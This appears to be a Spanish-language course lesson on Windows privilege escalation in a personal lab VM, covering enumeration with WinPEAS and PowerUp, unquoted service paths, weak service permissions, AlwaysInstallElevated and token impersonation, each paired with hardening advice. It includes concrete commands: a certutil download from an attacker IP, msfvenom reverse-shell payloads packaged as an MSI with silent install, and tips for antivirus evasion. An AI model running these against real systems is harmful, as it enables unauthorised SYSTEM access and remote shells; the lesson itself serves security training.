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077 — Escalada de privilegios en Windows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aprenderá a enumerar un host Windows comprometido con una cuenta estándar, identificar configuraciones inseguras (servicios con rutas o permisos débiles, políticas de instalación permisivas, privilegios de token abusables) y escalar hasta SYSTEM o administrador local en un entorno de laboratorio propio, entendiendo además cómo el equipo defensivo audita y corrige cada vector.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WinPEAS y comandos nativos de Windows para enumerar vectores de escalada.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y explotar servicios vulnerables a unquoted service path.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servicios con permisos de archivo o registro débiles y sustituir su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aplicar conceptualmente el abuso de tokens de acceso (SeImpersonatePrivilege) mediante ataques tipo Potato.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y explotar la configuración AlwaysInstallElevated.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rol de PowerUp/PowerSploit en la enumeración automatizada y su contraparte defensiva.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Enumeración con WinPEAS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PowerUp / PowerSploit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Unquoted service paths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DLL hijacking en servicios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AlwaysInstallElevated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Tokens de acceso e impersonation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UAC bypass (concepto)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WinPEAS: script de enumeración de la suite PEASS-ng para Windows, análogo a LinPEAS. Característica clave: colorea hallazgos por probabilidad de explotación, priorizando el trabajo del pentester.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correr WinPEAS de forma controlada en tu propio parque de máquinas permite a seguridad identificar y remediar hallazgos antes de que un atacante los encuentre.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Unquoted service path: ruta de ejecutable de un servicio que contiene espacios y no está entre comillas. Característica clave: Windows intenta ejecutar cada segmento de la ruta hasta el primer espacio, permitiendo colocar un binario malicioso en una carpeta intermedia escribible.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forzar el uso de comillas en todas las rutas de servicio (auditable con GPO o scripts de compliance) elimina este vector de raíz.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Servicio con permisos débiles: un servicio cuyo binario, carpeta contenedora o clave de registro son modificables por un usuario no privilegiado. Característica clave: sustituir el binario y reiniciar el servicio ejecuta código arbitrario con el privilegio del servicio (a menudo SYSTEM).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aplicar ACLs estrictas (solo administradores con escritura) sobre binarios y carpetas de servicios es una revisión de hardening de bajo costo y alto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AlwaysInstallElevated: par de claves de registro (HKCU y HKLM) que, si ambas están activas, permiten a cualquier usuario instalar paquetes .msi con privilegios de SYSTEM. Característica clave: requiere ambas claves activas simultáneamente para ser explotable.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de laboratorio: una VM Windows 10/11 o Windows Server propia, deliberadamente configurada con al menos un servicio vulnerable, para practicar sin riesgo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WinPEAS (winPEASx64.exe/winPEASx86.exe): transferir vía certutil -urlcache -f http://IP:8000/winPEASx64.exe wp.exe desde un servidor HTTP en la máquina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PowerUp.ps1 (parte de PowerSploit): script PowerShell de auditoría de privilegios; se ejecuta con . .\PowerUp.ps1; Invoke-AllChecks.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accesschk.exe (Sysinternals): para verificar permisos efectivos sobre servicios y binarios.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PrintSpoofer / GodPotato: binarios de prueba de concepto para abuso de SeImpersonatePrivilege, usados únicamente contra la VM de laboratorio propia.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Seatbelt: herramienta de enumeración en C# de la suite Ghostpack, útil como alternativa o complemento a WinPEAS para checks más específicos de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msfvenom: generador de payloads de Metasploit Framework, usado para crear los binarios/MSI de prueba en el laboratorio.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el contexto actual: whoami, whoami /priv, whoami /groups, systeminfo.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Transfiere y ejecuta WinPEAS: certutil -urlcache -f http://IPATACANTE:8000/winPEASx64.exe wp.exe y luego .\wp.exe &gt; peas.txt.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servicios con ruta sin comillas: wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """.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permisos sobre el servicio candidato con accesschk: accesschk.exe -uwcqv usuario NombreDelServicio.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el resultado muestra SERVICEALLACCESS o similar para tu usuario, reemplaza el binario o crea el ejecutable en la ruta intermedia con un payload generado con msfvenom -p windows/x64/shellreversetcp ....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AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated y la misma consulta contra HKLM.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ambas claves están en 1, genera un MSI malicioso con msfvenom -p windows/x64/shellreversetcp LHOST=IP LPORT=4444 -f msi -o payload.msi e instálalo con msiexec /quiet /qn /i payload.msi.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WinPEAS y clasifica los tres hallazgos con mayor probabilidad de escalada.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intencionalmente un servicio con ruta sin comillas y demuestra su explotación.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PowerUp para detectar el mismo servicio y compara la salida con WinPEAS.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y explota (en laboratorio) una configuración AlwaysInstallElevated activa.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y documenta conceptualmente cómo PrintSpoofer abusa de SeImpersonatePrivilege, sin necesidad de ejecutar el exploit en un sistema de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lista de comandos de hardening (GPO o PowerShell) para cerrar cada vector estudiado.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 tu VM Windows de laboratorio (con al menos dos vectores configurados: un servicio con permisos débiles y AlwaysInstallElevated activo), obtén privilegios de SYSTEM o administrador local por dos caminos distintos.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alumno entrega evidencia de whoami mostrando nt authority\system (o cuenta administradora) para cada uno de los dos métodos, con el comando exacto de explotación y la remediación correspondiente documentada.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WinPEAS bloqueado por el antivirus — Comportamiento esperado en producción; en el laboratorio, desactivar temporalmente el AV o usar la firma menos detectada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accesschk.exe no reconocido — Falta descargar Sysinternals Suite; agregar la carpeta al PATH o invocar con ruta absoluta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servicio no reinicia tras reemplazar el binario — Faltan permisos para reiniciar el servicio; verificar con sc qc NombreServicio y usar una cuenta con SERVICESTART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AlwaysInstallElevated parece activo pero el MSI no eleva — Solo una de las dos claves (HKCU/HKLM) está en 1; deben estar ambas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PrintSpoofer falla con "Access Denied" — La cuenta no tiene SeImpersonatePrivilege habilitado; confirmar con whoami /priv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payload de msfvenom es detectado de inmediato — AV moderno con firmas conocidas; en laboratorio, usar encoding o deshabilitar temporalmente el AV, nunca en producción sin autorización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necesario tener antivirus desactivado para practicar esto?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es obligatorio, pero en el laboratorio suele desactivarse temporalmente para centrarse en la lógica de la técnica; en un pentest real, evadir EDR es una habilidad separada que se practica en otra clase.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¿UAC me protege de estos ataques?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UAC filtra ejecuciones interactivas, pero Microsoft explícitamente no lo considera un límite de seguridad; muchas de estas técnicas (servicios, tokens, AlwaysInstallElevated) no dependen de UAC en absoluto.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SeImpersonatePrivilege suele estar presente en cuentas de servicio?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muchos servicios web (IIS, MSSQL) necesitan impersonar al usuario autenticado para acceder a recursos con su identidad; es funcionalidad legítima que se vuelve peligrosa si el atacante compromete ese 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detecta un equipo azul esta escalada?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Peter Kim, The Hacker Playbook 3, Secure Planet LLC.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PEASS-ng (WinPEAS) — &lt;https://github.com/peass-ng/PEASS-ng&gt;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Microsoft, Sysinternals accesschk — &lt;https://learn.microsoft.com/sysinternals/downloads/accesschk&gt;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T1134 Access Token Manipulation — &lt;https://attack.mitre.org/techniques/T1134/&gt;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T1574 Hijack Execution Flow — &lt;https://attack.mitre.org/techniques/T1574/&gt;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